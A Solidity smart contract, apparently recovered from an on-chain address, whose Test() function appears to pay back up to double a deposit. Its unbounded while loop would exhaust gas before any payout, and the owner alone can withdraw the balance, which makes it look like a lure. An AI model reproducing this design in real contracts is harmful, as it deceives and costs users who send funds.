/* 
 source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract WhileTest at 0xf5b1d75f4415f853fef2466a5ab8e412d593dd44
*/
pragma solidity ^0.4.18;

contract WhileTest
{
    address owner = msg.sender;
    
    function withdraw()
    payable
    public
    {
        require(msg.sender==owner);
        owner.transfer(this.balance);
    }
    
    function() payable {}
    
    function Test()
    payable
    public
    {
        if(msg.value>=1 ether)
        {
            
            var i1 = 1;
            var i2 = 0;
            var amX2 = msg.value*2;
            
            while(true)
            {
                if(i1<i2)break;
                if(i1>amX2)break;
                
                i2=i1;
                i1++;
            }
            msg.sender.transfer(i2);
        }
    }
}